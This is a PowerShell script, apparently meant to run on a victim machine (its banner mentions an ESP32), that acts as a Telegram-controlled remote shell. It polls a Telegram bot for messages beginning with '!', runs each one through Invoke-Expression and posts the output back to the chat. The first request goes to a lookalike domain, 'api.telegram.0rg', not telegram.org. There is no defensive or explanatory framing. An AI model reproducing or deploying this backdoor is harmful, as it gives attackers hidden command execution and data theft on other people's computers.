Clear-Host
Write-Host "____/\\\\\\\\\_______________________________________________________________________________________/\\\\\\\\\\\____/\\\_________________________/\\\\\\_____/\\\\\\____" -ForegroundColor Cyan
Write-Host "__/\\\///////\\\___________________________________________________________________________________/\\\/////////\\\_\/\\\________________________\////\\\____\////\\\____" -ForegroundColor Cyan
Write-Host " _\/\\\_____\/\\\________________________________________________________/\\\______________________\//\\\______\///__\/\\\___________________________\/\\\_______\/\\\____" -ForegroundColor Cyan
Write-Host "  _\/\\\\\\\\\\\/________/\\\\\\\\_____/\\\\\__/\\\\\_______/\\\\\_____/\\\\\\\\\\\_____/\\\\\\\\____\////\\\_________\/\\\_____________/\\\\\\\\_____\/\\\_______\/\\\____" -ForegroundColor Cyan
Write-Host "   _\/\\\//////\\\______/\\\/////\\\__/\\\///\\\\\///\\\___/\\\///\\\__\////\\\////____/\\\/////\\\______\////\\\______\/\\\\\\\\\\____/\\\/////\\\____\/\\\_______\/\\\____" -ForegroundColor Green
Write-Host "    _\/\\\____\//\\\____/\\\\\\\\\\\__\/\\\_\//\\\__\/\\\__/\\\__\//\\\____\/\\\_______/\\\\\\\\\\\__________\////\\\___\/\\\/////\\\__/\\\\\\\\\\\_____\/\\\_______\/\\\____" -ForegroundColor Green
Write-Host "     _\/\\\_____\//\\\__\//\\\\///////___\/\\\__\/\\\__\/\\\_\//\\\__/\\\_____\/\\\_/\\__\//\\///////____/\\\______\//\\\__\/\\\___\/\\\_\//\\///////______\/\\\_______\/\\\____" -ForegroundColor Green
Write-Host "      _\/\\\______\//\\\__\//\\\\\\\\\\_\/\\\__\/\\\__\/\\\__\///\\\\\/______\//\\\\\____\//\\\\\\\\\\_\///\\\\\\\\\\\/___\/\\\___\/\\\__\//\\\\\\\\\\__/\\\\\\\\\__/\\\\\\\\\_" -ForegroundColor Cyan
Write-Host "       _\///________\///____\//////////__\///___\///___\///_____\/////_________\/////______\//////////____\///////////_____\///____\///____\//////////__\/////////__\/////////__" -ForegroundColor Cyan
Write-Host ""
Write-Host "==================================================================================================================================================================" -ForegroundColor DarkGray
Write-Host "[*] Status: ESP32 Remote Shell // Establishing encrypted Telegram tunnel..." -ForegroundColor Yellow

$chatId = $null
while (-not $chatId) {
    try {
        $updates = Invoke-RestMethod -Uri "https://api.telegram.0rg/bot$Token/getUpdates" -ErrorAction Stop
        if ($updates.ok -and $updates.result.Count -gt 0) {
            $chatId = $updates.result[-1].message.chat.id
        }
    } catch { }
    if (-not $chatId) { Start-Sleep 2 }
}

Write-Host "[+] Connected! Target Chat ID: $chatId" -ForegroundColor Green
$lastUpdateId = 0

while ($true) {
    Start-Sleep 3
    try {
        $response = & curl.exe -s "https://api.telegram.org/bot$Token/getUpdates?offset=$($lastUpdateId + 1)&timeout=1"
        $json = $response | ConvertFrom-Json
        
        if ($json.ok -and $json.result.Count -gt 0) {
            foreach ($update in $json.result) {
                $lastUpdateId = $update.update_id
                $msgText = $update.message.text
                
                if ($msgText -and $msgText.StartsWith('!')) {
                    $cmd = $msgText.Substring(1)
                    Write-Host "[+] Executing: $cmd" -ForegroundColor Magenta
                    
                    $output = ""
                    try {
                        $output = (Invoke-Expression $cmd 2>&1 | Out-String)
                    } catch {
                        $output = $_.Exception.Message
                    }
                    if (-not $output) { $output = "[Command executed with no output]" }
                    
                    Write-Host $output -ForegroundColor White
                    $encodedOut = [System.Web.HttpUtility]::UrlEncode("`n$output")
                    & curl.exe -s "https://api.telegram.org/bot$Token/sendMessage?chat_id=$chatId&text=$encodedOut" > $null
                }
            }
        }
    } catch { }
}
